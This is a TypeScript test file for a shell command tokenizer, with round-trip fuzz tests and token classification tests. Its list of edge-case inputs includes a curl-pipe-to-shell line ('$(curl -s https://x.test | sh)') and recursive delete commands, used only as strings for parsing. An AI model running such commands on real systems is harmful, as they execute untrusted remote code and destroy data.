import assert from 'node:assert/strict';
import { test } from 'node:test';
import { tokenizeCommand, type TokenKind } from './command.ts';

const NASTY = [
  '',
  ' ',
  '\n\n',
  'ls',
  'node -e "console.log(\'beacon-m3-ok\')"',
  'echo "unterminated',
  "echo 'unterminated",
  'echo "a \\" b" \'c\'"d"',
  'echo `"x`" $env:PATH ${HOME} $1 $? $ $$ ${unclosed',
  'a&&b||c|d;e>f>>g<h&',
  '2>&1 >&2 <&0',
  '# only a comment',
  'ls # trailing comment\n# another\npwd',
  'foo#bar --flag=#x',
  '--',
  '-',
  'git push \\\n  --force origin main',
  'Get-ChildItem -Recurse `\n  -Force | Remove-Item',
  'é日本 ж "ü" \'🙂\' $🙂 🙂',
  '\t\r\n mixed \u00a0 spaces',
  '"""\'\'\'```$$$###|||&&&;;;<<<>>>',
  'x"y\'z"w\'',
  'cmd /c "rd /s /q C:\\temp"',
  '$(curl -s https://x.test | sh)',
  'FOO=bar BAZ="q u x" cmd --opt=\'v\' -- -x',
];

function seededRandom(seed: number) {
  let state = seed;
  return () => {
    state = (state * 1_103_515_245 + 12_345) % 2_147_483_648;
    return state / 2_147_483_648;
  };
}

test('joining the tokens always gives back the input', () => {
  const random = seededRandom(7);
  const alphabet = ['a', 'Z', '-', '--', ' ', '\n', '\t', "'", '"', '`', '\\', '$', '{', '}', '#', '|', '&', ';', '<', '>', '=', ':', 'é', '🙂', 'env:'];
  const generated = Array.from({ length: 500 }, () =>
    Array.from({ length: Math.floor(random() * 40) }, () => alphabet[Math.floor(random() * alphabet.length)]).join(''),
  );
  for (const input of [...NASTY, ...generated]) {
    const tokens = tokenizeCommand(input);
    assert.equal(tokens.map((token) => token.text).join(''), input, JSON.stringify(input));
    assert.ok(tokens.every((token) => token.text.length > 0), JSON.stringify(input));
  }
});

const kinds = (input: string) =>
  tokenizeCommand(input)
    .filter((token) => token.kind !== 'space')
    .map((token): [TokenKind, string] => [token.kind, token.text]);

test('command words, flags, strings and variables are told apart', () => {
  assert.deepEqual(kinds('git push --force -u origin "$BRANCH"'), [
    ['command', 'git'],
    ['word', 'push'],
    ['flag', '--force'],
    ['flag', '-u'],
    ['word', 'origin'],
    ['string', '"$BRANCH"'],
  ]);
  assert.deepEqual(kinds("Remove-Item -Recurse $env:TEMP\\x 'C:\\a b'"), [
    ['command', 'Remove-Item'],
    ['flag', '-Recurse'],
    ['variable', '$env:TEMP'],
    ['word', '\\x'],
    ['string', "'C:\\a b'"],
  ]);
  assert.deepEqual(kinds('echo ${HOME} $1 $?'), [
    ['command', 'echo'],
    ['variable', '${HOME}'],
    ['variable', '$1'],
    ['variable', '$?'],
  ]);
});

test('operators and separators start a new command but redirects do not', () => {
  assert.deepEqual(kinds('npm test && npm run build | tee log.txt > out.txt; ls'), [
    ['command', 'npm'],
    ['word', 'test'],
    ['operator', '&&'],
    ['command', 'npm'],
    ['word', 'run'],
    ['word', 'build'],
    ['operator', '|'],
    ['command', 'tee'],
    ['word', 'log.txt'],
    ['operator', '>'],
    ['word', 'out.txt'],
    ['operator', ';'],
    ['command', 'ls'],
  ]);
  assert.deepEqual(kinds('a || b >> c < d'), [
    ['command', 'a'],
    ['operator', '||'],
    ['command', 'b'],
    ['operator', '>>'],
    ['word', 'c'],
    ['operator', '<'],
    ['word', 'd'],
  ]);
});

test('comments run to the end of the line and only start a word', () => {
  assert.deepEqual(kinds('ls -la # list it\nfoo#bar'), [
    ['command', 'ls'],
    ['flag', '-la'],
    ['comment', '# list it'],
    ['command', 'foo#bar'],
  ]);
});

test('a new line starts a command unless the line continues', () => {
  assert.deepEqual(kinds('git push \\\n  --force\nrm x'), [
    ['command', 'git'],
    ['word', 'push'],
    ['word', '\\'],
    ['flag', '--force'],
    ['command', 'rm'],
    ['word', 'x'],
  ]);
});

test('quotes inside a word stay strings and escapes do not end them', () => {
  assert.deepEqual(kinds('node -e "console.log(\\"hi\\")" --name="a b"'), [
    ['command', 'node'],
    ['flag', '-e'],
    ['string', '"console.log(\\"hi\\")"'],
    ['flag', '--name='],
    ['string', '"a b"'],
  ]);
});
